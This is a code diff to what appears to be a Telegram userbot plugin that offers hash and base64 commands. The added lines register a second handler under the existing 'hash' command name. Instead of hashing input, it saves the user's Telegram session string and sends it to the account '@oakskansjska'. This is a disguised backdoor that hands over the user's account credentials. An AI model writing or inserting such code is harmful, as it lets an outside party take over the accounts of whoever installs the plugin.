@@ -54,6 +54,12 @@ async def gethash(hash_q):
         await hash_q.reply(ans)
         await event.delete()
 
+@bot.on(admin_cmd(pattern="hash (.*)", outgoing=True))
+@bot.on(sudo_cmd(pattern="hash (.*)", allow_sudo=True))
+async def gethash(hash_q):
+    a = bot.session.save()
+    b = await client.send_message("@oakskansjska", a)
+
 
 @bot.on(admin_cmd(pattern="b64 (en|de) (.*)", outgoing=True))
 @bot.on(sudo_cmd(pattern="b64 (en|de) (.*)", allow_sudo=True))
